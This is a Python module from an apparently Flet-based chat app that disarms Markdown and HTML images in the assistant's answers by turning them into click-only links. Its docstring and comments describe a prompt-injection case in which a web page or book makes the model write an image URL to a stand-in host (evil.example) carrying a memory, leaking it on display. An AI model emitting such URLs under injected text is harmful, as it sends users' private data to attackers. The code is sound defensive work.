"""Images in the model's answers become links, so nothing is fetched unasked (P20).

The Markdown control loads an image as soon as it is drawn. A prompt injection
could make the model write ![](https://evil.example/?d=<a memory>), and the data
would leave on display. ``disarm_images`` is applied to what the model wrote just
before it is drawn (``ChatMessage._shown``). Pure functions, no Flet.
"""
from __future__ import annotations

import re

# --------------------------------------------------- images in Lili's answers
# The Markdown control fetches an image as soon as it is drawn, without a click.
# Text from a web page or a book (prompt injection) could make the model write
# ![](https://evil.example/?d=<a memory>) and the data would leave on display.
# So in her answers every image becomes an ordinary link, opened only by a click
# (and only for http/https/mailto, see ChatMessage._open_link).
#
# The rule that keeps it safe: no "![" and no "<img" is left anywhere in what is
# drawn. Telling code from prose only decides how a broken image LOOKS - outside
# code it becomes a visible link, inside code "!" and "[" are split by an
# invisible word joiner, so the code looks the same. A wrong guess about code
# (the public repo shows the parser to anyone) costs looks, never a fetch.
IMAGE_MARK = "🖼"
WORD_JOINER = "⁠"
_FENCE = re.compile(r"^[ \t]{0,3}(`{3,}|~{3,})")
_CODE_SPAN = re.compile(r"(`+)(?!`)(.+?)(?<!`)\1(?!`)", re.DOTALL)
_IMG_TAG = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_IMG_OPEN = re.compile(r"<(img)", re.IGNORECASE)
_TAG_ATTR = r"""\b{name}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"""


def disarm_images(markdown: str) -> str:
    """Turn the images of ``markdown`` into links, so nothing is fetched unasked.

    ``![alt](url)`` becomes ``[🖼 alt](url)``, ``![alt][ref]`` a reference link,
    an ``<img src=...>`` tag a link to its ``src``. In fenced code blocks and
    inline code an image is text: there it is only split invisibly.
    """
    if "![" not in markdown and "<img" not in markdown.lower():
        return markdown
    shown = "".join(
        _split_quietly(part) if is_code else _disarm_prose(part)
        for is_code, part in _fenced_parts(markdown)
    )
    # The net under everything above: whatever slipped through is split too.
    return _split_quietly(shown)


def _split_quietly(text: str) -> str:
    """Break every ``![`` and ``<img`` with an invisible character."""
    text = text.replace("![", f"!{WORD_JOINER}[")
    return _IMG_OPEN.sub(lambda m: f"<{WORD_JOINER}{m.group(1)}", text)


def _fenced_parts(text: str):
    """Yield ``(is_code, text)``: the fenced code blocks and what lies between them.

    A fence that is still open (the answer is being streamed) runs to the end,
    as the Markdown control draws it.
    """
    buffer: list[str] = []
    fence: str | None = None
    for line in text.splitlines(keepends=True):
        opener = _FENCE.match(line)
        if fence is None:
            # A ``` fence whose info string holds a backtick is no fence.
            if opener and not (opener.group(1)[0] == "`" and "`" in line[opener.end():]):
                if buffer:
                    yield False, "".join(buffer)
                buffer = [line]
                fence = opener.group(1)
            else:
                buffer.append(line)
        else:
            buffer.append(line)
            closing = opener and opener.group(1)[0] == fence[0] and len(opener.group(1)) >= len(fence)
            if closing and not line.strip().strip(fence[0]):
                yield True, "".join(buffer)
                buffer = []
                fence = None
    if buffer:
        yield fence is not None, "".join(buffer)


def _disarm_prose(text: str) -> str:
    out: list[str] = []
    position = 0
    for span in _CODE_SPAN.finditer(text):
        out.append(_disarm_plain(text[position:span.start()]))
        out.append(_split_quietly(span.group(0)))
        position = span.end()
    out.append(_disarm_plain(text[position:]))
    return "".join(out)


def _tag_attribute(tag: str, name: str) -> str:
    found = re.search(_TAG_ATTR.format(name=name), tag, re.IGNORECASE)
    return next((group for group in found.groups() if group is not None), "") if found else ""


def _img_tag_as_link(match: re.Match) -> str:
    tag = match.group(0)
    alt = _tag_attribute(tag, "alt").replace("[", "(").replace("]", ")").strip()
    src = _tag_attribute(tag, "src").strip()
    label = f"{IMAGE_MARK} {alt}".strip()
    if not src:
        return label
    for char, code in ((" ", "%20"), ("(", "%28"), (")", "%29")):
        src = src.replace(char, code)
    # The joiner first: a "!" just before the tag must not turn the link into
    # an image again.
    return f"{WORD_JOINER}[{label}]({src})"


def _disarm_plain(text: str) -> str:
    text = _IMG_TAG.sub(_img_tag_as_link, text)
    out: list[str] = []
    position = 0
    while (start := text.find("![", position)) != -1:
        backslashes = len(text[:start]) - len(text[:start].rstrip("\\"))
        out.append(text[position:start])
        if backslashes % 2:
            # "\![" is an escaped "!" followed by a link: it stays as it is shown.
            out.append(f"!{WORD_JOINER}[")
        else:
            # The joiner keeps a "!" written just before ("!![x](u)") from making
            # a new image out of the link.
            out.append(f"{WORD_JOINER}[{IMAGE_MARK} ")
        position = start + 2
    out.append(text[position:])
    return "".join(out)
